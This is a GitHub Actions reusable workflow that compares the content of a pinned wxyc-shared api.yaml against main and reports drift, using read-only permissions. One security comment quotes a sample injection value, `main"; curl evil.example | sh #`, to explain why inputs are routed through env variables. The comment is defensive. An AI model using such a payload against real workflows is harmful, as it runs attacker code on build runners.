name: API Spec Drift Guard

# Reusable, READ-ONLY workflow that checks whether a caller's pinned
# wxyc-shared ref (see scripts/generate-python-models.sh's --ref flag) has
# fallen behind api.yaml on wxyc-shared's main branch.
#
# This is #319's option B': a merge to api.yaml here has no way to notify a
# Python consumer that its committed generated/api_models.py is now stale.
# Sending a cross-repo signal (the ticket's option B, `repository_dispatch`)
# would need a new write-scoped token stored in THIS repo -- a new
# cross-repo credential purely to save a consumer a scheduled poll. Instead,
# the consumer calls this workflow on ITS OWN schedule (or in a PR, or
# on-demand) and decides what to do with the result using its own
# GITHUB_TOKEN: open an issue, open a regen PR, or just log it. No shared
# secret, no cross-repo write scope, on either side.
#
# Invoked from a consumer repo's own thin caller workflow as:
#
#   name: wxyc-shared spec drift
#   on:
#     schedule:
#       - cron: '0 13 * * 1'  # weekly, Monday 13:00 UTC
#     workflow_dispatch: {}
#   permissions:
#     contents: read
#   jobs:
#     check-drift:
#       uses: WXYC/wxyc-shared/.github/workflows/check-api-spec-drift.yml@main
#       with:
#         pinned-ref: '<the commit SHA your generate-python-models.sh --ref is pinned to>'
#     # a following job, gated on `needs: check-drift` and
#     # `if: needs.check-drift.outputs.drift == 'true'`, is where the
#     # caller decides what "stale" means for it (open an issue, etc.) --
#     # that job needs its OWN write permissions, declared in the caller's
#     # own workflow file, not here.
#
# This workflow declares no secrets: everything it reads (wxyc-shared's
# main SHA, and api.yaml at two refs) is public, unauthenticated content --
# `git ls-remote` over the smart HTTP protocol for the SHA (does not count
# against GitHub's REST API rate limit) and `raw.githubusercontent.com`
# fetches for the two api.yaml copies, exactly as
# scripts/generate-python-models.sh's own download fallback already does.

on:
  workflow_call:
    inputs:
      pinned-ref:
        description: "The git ref of WXYC/wxyc-shared this caller's generated Python models are pinned to -- a commit SHA, ideally (see generate-python-models.sh --ref / WXYC_SHARED_REF)"
        required: true
        type: string
      wxyc-shared-ref:
        description: "Git ref of WXYC/wxyc-shared whose scripts/check-spec-drift.sh to run. Does NOT affect which ref's api.yaml is compared -- that is always wxyc-shared's current main vs. inputs.pinned-ref. Default: main, matching check-charset-corpus-drift.yml's equivalent input."
        required: false
        type: string
        default: "main"
    outputs:
      drift:
        description: "'true' if api.yaml's CONTENT (a SHA-256 comparison, not info.version -- see check-spec-drift.sh) differs between pinned-ref and wxyc-shared's current main, else 'false'"
        value: ${{ jobs.drift-check.outputs.drift }}
      current-sha:
        description: "wxyc-shared:main's current commit SHA at the time this workflow ran"
        value: ${{ jobs.drift-check.outputs.current-sha }}
      current-version:
        description: "api.yaml's info.version at wxyc-shared:main"
        value: ${{ jobs.drift-check.outputs.current-version }}
      pinned-version:
        description: "api.yaml's info.version at inputs.pinned-ref"
        value: ${{ jobs.drift-check.outputs.pinned-version }}

concurrency:
  group: api-spec-drift-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# Workflow-level GITHUB_TOKEN scope. STRICTLY READ-ONLY -- this workflow
# only ever reads public content (wxyc-shared's main SHA and api.yaml at two
# refs) and writes nothing anywhere. Do not add a write scope "just in
# case": per CLAUDE.md's Tag Stability Policy, reusable-workflow permissions
# intersect (caller AND callee) at job dispatch, so a caller that hardened
# to `contents: read` would startup_failure the moment this file asked for
# more, with no jobs and no obvious error in the log (see
# WXYC/Backend-Service#857). Escalating this floor in a future revision is
# itself a breaking change under that policy and needs a gha/v2 cut, not an
# edit here -- this file is new today and has no gha/v1 implications yet,
# but say so up front so a future editor doesn't escalate it casually.
permissions:
  contents: read

jobs:
  drift-check:
    runs-on: ubuntu-latest
    outputs:
      drift: ${{ steps.compare.outputs.drift }}
      current-sha: ${{ steps.compare.outputs.current-sha }}
      current-version: ${{ steps.compare.outputs.current-version }}
      pinned-version: ${{ steps.compare.outputs.pinned-version }}
    steps:
      - name: Checkout wxyc-shared (for the comparison script)
        uses: actions/checkout@v7
        with:
          repository: WXYC/wxyc-shared
          ref: ${{ inputs.wxyc-shared-ref }}
          path: wxyc-shared

      # No auth needed for either fetch: `git ls-remote` over the smart
      # HTTP protocol doesn't count against GitHub's REST API rate limit
      # (unlike `gh api repos/.../commits/main`), and raw.githubusercontent.com
      # serves public repo content unauthenticated -- the same fetch
      # scripts/generate-python-models.sh's own download fallback makes.
      #
      # SECURITY (PR #323 review): every `${{ }}` expression this workflow
      # needs inside a shell script is passed through `env:` and referenced
      # as a shell variable ("$PINNED_REF", not `${{ inputs.pinned-ref }}`
      # inline in `run:`). GitHub Actions substitutes `${{ }}` textually
      # BEFORE the shell parses the script, so an inline `${{
      # inputs.pinned-ref }}` lets a caller-controlled string like
      # `main"; curl evil.example | sh #` execute on the runner --
      # actionlint does not flag `inputs.*` as untrusted, so this doesn't
      # show up as a lint failure. Routing through `env:` makes the value a
      # normal, safely-quoted shell variable instead: the shell sees
      # literal text, not a fragment of the script it's about to parse.
      # This workflow's blast radius if this went wrong would have been
      # bounded (read-only token, no secrets) but the fix costs nothing and
      # is the standard hardening for every reusable workflow.
      #
      # CONTENT AT THE RESOLVED SHA, NOT AT THE LITERAL `main` REF AGAIN
      # (PR #323 review): fetching main's api.yaml via a second
      # `.../wxyc-shared/main/api.yaml` request, after already resolving
      # CURRENT_SHA via `git ls-remote`, is a race -- a merge landing
      # between the two requests makes the reported current-sha and the
      # fetched/hashed content come from different commits. Fetching
      # `.../wxyc-shared/${CURRENT_SHA}/api.yaml` instead removes the race:
      # the SHA in the output is provably the SHA whose content was hashed.
      - name: Resolve wxyc-shared:main's SHA and both api.yaml copies
        id: fetch
        env:
          PINNED_REF: ${{ inputs.pinned-ref }}
        run: |
          set -euo pipefail
          CURRENT_SHA="$(git ls-remote https://github.com/WXYC/wxyc-shared.git main | cut -f1)"
          if [[ -z "$CURRENT_SHA" ]]; then
            echo "::error::could not resolve WXYC/wxyc-shared:main's SHA via git ls-remote"
            exit 1
          fi

          CURRENT_FILE="$(mktemp)"
          PINNED_FILE="$(mktemp)"
          # Fetch main's api.yaml AT THE SHA JUST RESOLVED (not the moving
          # `main` ref a second time -- see the step comment above).
          curl -sSfL --max-time 30 --retry 3 "https://raw.githubusercontent.com/WXYC/wxyc-shared/${CURRENT_SHA}/api.yaml" -o "$CURRENT_FILE"
          curl -sSfL --max-time 30 --retry 3 "https://raw.githubusercontent.com/WXYC/wxyc-shared/${PINNED_REF}/api.yaml" -o "$PINNED_FILE"

          CURRENT_VERSION="$(grep -m1 '^  version:' "$CURRENT_FILE" | awk '{print $2}')"
          PINNED_VERSION="$(grep -m1 '^  version:' "$PINNED_FILE" | awk '{print $2}')"

          if command -v sha256sum >/dev/null 2>&1; then
            CURRENT_SHA256="$(sha256sum "$CURRENT_FILE" | awk '{print $1}')"
            PINNED_SHA256="$(sha256sum "$PINNED_FILE" | awk '{print $1}')"
          else
            CURRENT_SHA256="$(shasum -a 256 "$CURRENT_FILE" | awk '{print $1}')"
            PINNED_SHA256="$(shasum -a 256 "$PINNED_FILE" | awk '{print $1}')"
          fi
          rm -f "$CURRENT_FILE" "$PINNED_FILE"

          {
            echo "current-sha=$CURRENT_SHA"
            echo "current-version=$CURRENT_VERSION"
            echo "pinned-version=$PINNED_VERSION"
            echo "current-sha256=$CURRENT_SHA256"
            echo "pinned-sha256=$PINNED_SHA256"
          } >> "$GITHUB_OUTPUT"

      - name: Compare pinned api.yaml content against main
        id: compare
        env:
          PINNED_REF: ${{ inputs.pinned-ref }}
          PINNED_VERSION: ${{ steps.fetch.outputs.pinned-version }}
          PINNED_SHA256: ${{ steps.fetch.outputs.pinned-sha256 }}
          CURRENT_SHA: ${{ steps.fetch.outputs.current-sha }}
          CURRENT_VERSION: ${{ steps.fetch.outputs.current-version }}
          CURRENT_SHA256: ${{ steps.fetch.outputs.current-sha256 }}
        run: |
          bash wxyc-shared/scripts/check-spec-drift.sh \
            "$PINNED_REF" "$PINNED_VERSION" "$PINNED_SHA256" \
            "$CURRENT_SHA" "$CURRENT_VERSION" "$CURRENT_SHA256"
